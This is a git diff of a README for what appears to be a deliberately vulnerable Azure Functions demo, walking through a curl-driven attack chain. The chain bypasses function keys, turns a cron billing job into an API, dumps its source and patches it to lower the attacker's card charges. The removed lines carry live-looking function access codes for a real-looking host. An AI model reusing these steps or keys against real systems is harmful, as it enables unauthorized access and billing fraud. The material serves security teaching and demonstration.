@@ -67,59 +67,59 @@ SQL schema:
 Routes: (plug the relevant keys in for your own? functions app)
 
 vuln_api: takes your credit card #, returns just your charges.
-curl -X POST -d @benign.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @benign.json -K vuln.config`
 example: [{"amount":24.99,"date":"2017-06-15T00:00:00Z"},{"amount":5.99,"date":"2017-06-17T00:00:00Z"}]
 
 totalView: Doesn't take any arguments.  Returns the list of all charges.
-curl -X POST -d '{}' -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/TotalView?code=NKsfko79s6xRHgi838kqeoycX6Jk7gaALAY0Gwdb65afCETnY02pXA==
+`curl -X POST -d '{}' -K total.config`
 example: [{"card_id":1,"amount":24.99,"date":"2017-06-15T00:00:00Z"},{"card_id":1,"amount":5.99,"date":"2017-06-17T00:00:00Z"},{"card_id":2,"amount":8,"date":"2017-06-16T00:00:00Z"},{"card_id":2,"amount":29,"date":"2017-06-18T00:00:00Z"},{"card_id":2,"amount":0.99,"date":"2017-06-18T00:00:00Z"}]
 
 billing: Sums up the cards to do the billing.  Can't be triggered via API, is triggered via cron.
 
 Vulns:
-curl -X POST -d @print_return.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
-example: "hax!"
+`curl -X POST -d @print_return.json -K vuln.config`
+example: "custom text"
 
 List available functions with secret sets via list_functions:
-curl -X POST -d @list_functions.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @list_functions.json -K vuln.config`
 example: ["billing.json","host.json","httptriggerjs2.json","manualtriggerjs1.json","publicvuln.json","timertriggerjs1.json","totalview.json","totalview.json.bkup","totalview.json.orig"]
 
 Try to run totalview:
-curl -X POST -d '{}' -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/TotalView?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d '{}' -K total_noauth.config`
 example: this doesn't work because we don't have the key!
 
 Change permissions on totalview: (they keys on disk are encrypted, but they're all encrypted against the same key, so we can just copy in our known working one!)
-curl -X POST -d @change_totalview_perms.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @change_totalview_perms.json -K vuln.config`
 example: "done"
 
 After changing perms, run totalView again:
-curl -X POST -d '{}' -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/TotalView?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d '{}' -K total_noauth.config`
 example: [{"card_id":1,"amount":24.99,"date":"2017-06-15T00:00:00Z"},{"card_id":1,"amount":5.99,"date":"2017-06-17T00:00:00Z"},{"card_id":2,"amount":8,"date":"2017-06-16T00:00:00Z"},{"card_id":2,"amount":29,"date":"2017-06-18T00:00:00Z"},{"card_id":2,"amount":0.99,"date":"2017-06-18T00:00:00Z"}]
 
 Now what's Billing - let's read its function metadata:
-curl -X POST -d @read_billing_info.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @read_billing_info.json -K vuln.config`
 example: "{\r\n  \"bindings\": [\r\n    {\r\n      \"name\": \"myTimer\",\r\n      \"type\": \"timerTrigger\",\r\n      \"direction\": \"in\",\r\n      \"schedule\": \"0 0 0 1 * *\"\r\n    }\r\n  ],\r\n  \"disabled\": false\r\n}"
 
 We can't call it by API since it's a cron job.  Let's change it to being API-able:
-curl -X POST -d @change_billing_to_api.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @change_billing_to_api.json -K vuln.config`
 
 Now change the permissions to use our known key like above:
-curl -X POST -d @change_billing_perms.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @change_billing_perms.json -K vuln.config`
 
 Now we can query it via API:
-curl -X POST -d @benign.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/Billing?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @benign.json -K billing.config`
 example: [{"1234-5678-9012-3456":30.98},{"0000-0000-0000-0000":37.99}]
 
 But we don't want to be billed, right?  Let's see how billing works by dumping the source:
-curl -X POST -d @read_billing_source.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @read_billing_source.json -K vuln.config`
 example: <bunch of js source>
 
 Now let's put in something for our card:
-curl -X POST -d @patch_billing_code.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/PublicVuln?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @patch_billing_code.json -K vuln.config`
 example: "done"
 
 And when we query billing again:
-curl -X POST -d @benign.json -H "Content-Type: application/json" https://themnem-test.azurewebsites.net/api/Billing?code=pB8Aof9ly1YZ79x9ZlgkhWJXq7L3ZNINC09b17Y6SHuVIzHheHtdqA==
+`curl -X POST -d @benign.json -K billing.config`
 example: {"1234-5678-9012-3456":1,"0000-0000-0000-0000":37.99}
 
 
